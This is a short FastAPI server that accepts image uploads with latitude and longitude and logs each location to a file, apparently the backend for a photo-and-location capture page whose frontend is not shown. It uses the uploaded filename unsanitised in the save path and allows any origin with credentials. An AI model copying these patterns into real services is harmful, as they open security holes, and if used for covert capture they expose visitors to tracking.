from fastapi import FastAPI, File, UploadFile, Form
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
import shutil
import os
from datetime import datetime

app = FastAPI()

# Enable CORS (useful for development, though we are serving static files from same origin)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Ensure uploads directory exists
UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

@app.post("/api/upload")
async def upload_data(
    file: UploadFile = File(...),
    latitude: str = Form(...),
    longitude: str = Form(...)
):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"capture_{timestamp}_{file.filename}"
    file_path = os.path.join(UPLOAD_DIR, filename)
    
    # Save the image
    with open(file_path, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)
        
    # Log the location
    log_entry = f"[{datetime.now()}] Location: Lat {latitude}, Lon {longitude} | Image: {filename}\n"
    print(log_entry.strip())
    
    # Append to a log file
    with open(os.path.join(UPLOAD_DIR, "locations.log"), "a") as log_file:
        log_file.write(log_entry)
        
    return {"status": "success", "message": "Data received", "file": filename, "location": {"lat": latitude, "lon": longitude}}

# Mount the frontend directory to serve index.html
# We mount it at the root "/"
app.mount("/", StaticFiles(directory="frontend", html=True), name="frontend")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
